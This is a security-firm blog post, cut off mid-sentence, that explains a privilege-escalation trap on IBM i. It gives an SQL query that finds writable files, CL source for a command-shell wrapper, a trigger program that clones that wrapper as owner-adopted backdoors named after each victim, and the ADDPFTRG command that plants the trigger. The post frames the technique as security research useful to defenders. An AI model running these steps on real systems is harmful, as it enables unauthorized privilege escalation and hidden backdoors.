---
title: Booby Trapping IBM i
url: https://blog.silentsignal.eu/2023/03/30/booby-trapping-ibm-i/
source: Silent Signal Techblog
date: 2023-03-31
fetch_date: 2025-10-04T11:18:35.586816
---

# Booby Trapping IBM i

[![Silent Signal](/assets/img/s2_avatar.jpg)](/)

Silent Signal

Professional Ethical Hacking Services

### Contact us

2025 © Silent Signal

![Booby Trapping IBM i](/wp-content/uploads/2023/03/indiana_jones_booby_trap.jpg)

# Booby Trapping IBM i

[pz](/authors/pz.html) 2023-03-30

Post-exploitation is a crucial element of any attack aiming for realistic objectives, so it is no surprise that the topic is extensively researched, resulting in a [trove of information](http://attack.mitre.org/) that defenders can rely on to design and implement countermeasures. Unfortunately, owners of IBM i systems do not have the luxury of access to such information right now. This was one of the main ideas we discussed with [Ben Williams](https://www.chilli-it.co.uk/team/ben-williams/) of Chilli IT, who was kind enough to introduce us to IBM’s [Brunch and Learn](https://video.ibm.com/channel/s4Dub4uP9ku) webcast last week, where we discussed our penetration testing experiences from “the POWER island”.

In this blog post we reflect on this problem by providing a technical example. We share a technique that not only allows attackers to escalate their privileges by abusing standard permissions, but can also be useful for defenders to catch perpetrators red handed, and to gain better understanding of their behavior and motives.

[![Clifford Stoll's <a href='https://en.wikipedia.org/wiki/The_Cuckoo%27s_Egg_(book)' target='_blank'>The Cuckoo's Egg</a> is an inspiration for those who are up for some threat hunting](/wp-content/uploads/2023/03/cuckoosegg.jpg)](/wp-content/uploads/2023/03/cuckoosegg.jpg)

Clifford Stoll's [The Cuckoo's Egg](https://en.wikipedia.org/wiki/The_Cuckoo%27s_Egg_%28book%29) is an inspiration for those who are up for some threat hunting

### Basics

In our [first post](https://blog.silentsignal.eu/2022/09/05/simple-ibm-i-as-400-hacking/) about IBM i we noted that the operating system includes a database engine, Db2. This level of integration means that practically all objects of the system are accessible via SQL, a powerful tool to discover and analyze system configuration, and also to identify [potential vulnerabilities](https://blog.silentsignal.eu/2022/09/28/another-tale-of-ibm-i-as-400-hacking/). However, the “database view” of the operating system not only allows us to read data, but lets us insert additional data that can affect the behavior of the system too.

As with most modern relational database management systems, it is possible to create database triggers that can be configured to execute actions when specific events occur.
On IBM i, a database trigger is a special type of object that is associated with a specific [database file](https://www.ibm.com/docs/en/i/7.4?topic=concepts-database-files) or [table](https://www.ibm.com/docs/en/db2/11.5?topic=administration-database-objects) and is triggered automatically when a specific operation is performed on that file or table, such as an `INSERT`, `UPDATE`, or `DELETE` statement. The neat part is that since on IBM i everything is an object, and we have this handy RDBMS interface to manipulate objects, we can also create triggers for *any* (physical) file object!

### Trap Placement

The command to add triggers to *physical files* is [ADDPFTRG](https://www.ibm.com/docs/en/i/7.1?topic=ssw_ibm_i_71/cl/addpftrg.html), which requires at least the following authorities to work (for more details see the linked documentation):

* For the target physical file object:
  + `*READ`, `*OBJOPR`, and `*OBJALTER` authorities **or**
  + `*OBJMGT` authority
* For the library that contains the target object:
  + `*EXECUTE` privileges

The other ingredient of our attack is that triggers can be defined so that they execute programs. `*EXECUTE` authority is required on the trigger program and its library too, but this is usually not a problem since we will create these programs.

The SQL query below enumerates all the files that are candidates for this attack, matching the above criteria:

```
SELECT
    OFILE.SYSTEM_OBJECT_SCHEMA,
    OFILE.SYSTEM_OBJECT_NAME,
    OFILE.AUTHORIZATION_NAME,
    OFILE.OBJECT_AUTHORITY
FROM
    QSYS2.OBJECT_PRIVILEGES OFILE
JOIN QSYS2.OBJECT_PRIVILEGES OL ON
    OL.SYSTEM_OBJECT_NAME = OFILE.SYSTEM_OBJECT_SCHEMA AND
    OFILE.AUTHORIZATION_NAME = OL.AUTHORIZATION_NAME
WHERE
    ((OFILE.DATA_READ = 'YES' AND
    OFILE.OBJOPER = 'YES' AND
    OFILE.OBJALTER = 'YES') OR
    OFILE.OBJMGT = 'YES') AND
    OL.DATA_EXECUTE='YES' AND
    OFILE.OBJECT_TYPE = '*FILE' AND
    OL.OBJECT_TYPE = '*LIB' AND
    OFILE.SYSTEM_OBJECT_NAME NOT LIKE 'Q%' AND
    OFILE.AUTHORIZATION_NAME NOT LIKE 'Q%' AND
    OFILE.AUTHORIZATION_NAME <> OFILE.OWNER
```

In our test system, this query produces the following output with `USERB2` (special authority: `*NONE`) profile:

```
SYSTEM_OBJECT_SCHEMA SYSTEM_OBJECT_NAME AUTHORIZATION_NAME OBJECT_AUTHORITY
---------------------------------------------------
USERB1 SAVE1 *PUBLIC *ALL
USERB1 USERDB *PUBLIC *ALL
```

### Assembly

`USERB1/USERDB` is a suitable candidate for setting up an SQL trigger to perform privilege escalation. Since we can’t predict who exactly will fall in our trap, we will create individual “backdoor” programs that would grant us access with the privileges of their corresponding victims. We set the stage for our exploit with the following steps:

1. Create a `QCMD` wrapper `*PGM` because the default object authorities don’t allow [duplicating](https://www.ibm.com/docs/en/i/7.3?topic=ssw_ibm_i_73/cl/crtdupobj.html) the built-in `QSYS/QCMD` object.

   You can use the following simple CL script for executing interactive commands:

   ```
    PGM
        CALL QCMD /* Compile to USERB2/FAKEQCMD */
    ENDPGM
   ```
2. Set the `*PGM` authority to `*PUBLIC *ALL`, which allows any user to duplicate the object.
3. Create a library (`PENTESTLIB`) that will contain the duplicated `QCMD` wrappers. Set the authority of the `*LIB` to `*PUBLIC *ALL`, which allows any user to create the `QCMD` wrapper in the library (we should cover OPSEC considerations later :)).
4. Create the following trigger `*PGM` (`USERB2/TRIGGER`) object:

   ```
    PGM
        DCL VAR(&USRPRF) TYPE(*CHAR) LEN(10)
        /* The name of the current user profile. */
        RTVUSRPRF USRPRF(*CURRENT) RTNUSRPRF(&USRPRF)

        /* Verify the existence of the QCMD wrapper. */
        CHKOBJ OBJ(PENTESTLIB/&USRPRF) OBJTYPE(*PGM)
        MONMSG MSGID(CPF9801) EXEC(DO) /* Object &2 in library &3 not found.  */
            /* Duplicate the QCMD wrapper with the name of the current user profile. */
            CRTDUPOBJ OBJ(FAKEQCMD) FROMLIB(USERB2) OBJTYPE(*PGM) TOLIB(PENTESTLIB) NEWOBJ(&USRPRF)
            CHGPGM PGM(PENTESTLIB/&USRPRF) USRPRF(*OWNER) /* See below */
        ENDDO
    ENDPGM
   ```

   The `CHGPM` command sets up the `*USRPRF` parameter of the duplicated program to `*OWNER`, which works like the SETUID bit on Unix-like systems: when a program gets executed, it takes the user profiles of both the program owner and the current user into account (see our [other post](https://blog.silentsignal.eu/2023/01/20/abusing-adopted-authority-on-ibm-i/) for more details). In our case, the owner will obviously be the user profile that activated the trap and executed the trigger.
5. Add the trigger `*PGM` to the database file (`USERB1/USERDB`). In this example, an `*AFTER` trigger is [configured](https://www.ibm.com/support/pages/restrictions-triggers-trgeventread) for the `*READ` event:

   ```
    ADDPFTRG FILE(USERB1/USERDB) TRGTIME(*AFTER) TRGEVENT(*READ) PGM(USERB2/TRIGGER)
   ```

At this point our trap is ready, we only need to wait for one of the system users to execute a read operation on the `USERB1/USERDB` object.
Once this occurs, our `*PGM` trigger will create a `QCMD` wrapper in the `PENTESTLIB` library with the profile name of the victim, who will also be the owner of the program.
Finally, we can execute the wrapper using a simple `CALL` command, and the resulting shell will...